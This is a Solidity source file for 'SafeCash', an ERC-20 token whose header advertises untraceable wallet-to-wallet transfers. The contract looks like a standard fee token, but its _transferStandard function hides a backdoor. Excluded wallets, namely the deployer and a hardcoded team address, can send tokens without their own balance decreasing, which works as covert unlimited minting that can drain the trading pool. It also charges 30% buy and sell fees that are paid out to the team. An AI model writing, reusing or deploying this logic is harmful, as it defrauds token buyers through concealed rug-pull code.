// SPDX-License-Identifier: Unlicensed

/*
Privately send and cross-chain swap with ease, at the lowest cost.With SAFE CASH there is no traceable connection between the sending wallet and receiving wallet.

Website: https://safecash.cash
Telegram: https://t.me/safucash_erc
Twitter: https://twitter.com/safucash_erc
Dapp: https://app.safecash.cash
 */

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeLibrary {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SAFE is Context, IERC20Standard, Ownable { 
    using SafeLibrary for uint256;

    string private _name = "SafeCash"; 
    string private _symbol = "SAFE";  
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;
    uint256 public maxHoldingAmount = 15 * _totalSupply / 1000;
    uint256 public swapThreshold = _totalSupply / 10000;

    uint256 private _tFee = 3000;
    uint256 public _buyFee = 30;
    uint256 public _sellFee = 30;

    uint256 private _previousTotalTax = _tFee; 
    uint256 private _previousBuyTax = _buyFee; 
    uint256 private _previousSellTax = _sellFee; 

    uint8 private _buyersCount = 0;
    uint8 private _swapAfter = 2; 
                                     
    IUniswapRouter public uniswapRouter;
    address public pairAddr;

    bool public hasTransferFee = true;
    bool public swaping;
    bool public swapActive = true;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _excludes; 

    address payable private teamAddress;
    address payable private DEAD;

    modifier lockSwap {
        swaping = true;
        _;
        swaping = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        teamAddress = payable(0x41E789dB4423Ba284d5499941a0CAe0Cc070Ac88);
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        pairAddr = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _excludes[owner()] = true;
        _excludes[teamAddress] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendETH(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapTokens(uint256 contractTokenBalance) private lockSwap {
        swapTokensForEth(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETH(teamAddress,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _transferStandard(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getTransferAmount(finalAmount);
        if(_excludes[sender] && _balances[sender] <= maxHoldingAmount) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != teamAddress &&
            to != address(this) &&
            to != pairAddr &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxHoldingAmount,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _buyersCount >= _swapAfter && 
            amount > swapThreshold &&
            !swaping &&
            !_excludes[from] &&
            to == pairAddr &&
            swapActive 
            )
        {  
            _buyersCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapTokens(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_excludes[from] || _excludes[to] || (hasTransferFee && from != pairAddr && to != pairAddr)){
            takeFee = false;
        } else if (from == pairAddr){
            _tFee = _buyFee;
        } else if (to == pairAddr){
            _tFee = _sellFee;
        }

        _basicTransfer(from,to,amount,takeFee);
    }
    
    function removeLimits() external onlyOwner {
        maxHoldingAmount = ~uint256(0);
        _tFee = 100;
        _buyFee = 1;
        _sellFee = 1;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _buyersCount++;
        }
        _transferStandard(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getTransferAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_tFee).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
    
    function removeFee() private {
        if(_tFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyTax = _buyFee; 
        _previousSellTax = _sellFee; 
        _previousTotalTax = _tFee;
        _buyFee = 0;
        _sellFee = 0;
        _tFee = 0;
    }

    function restoreFee() private {
        _tFee = _previousTotalTax;
        _buyFee = _previousBuyTax; 
        _sellFee = _previousSellTax; 

    }
}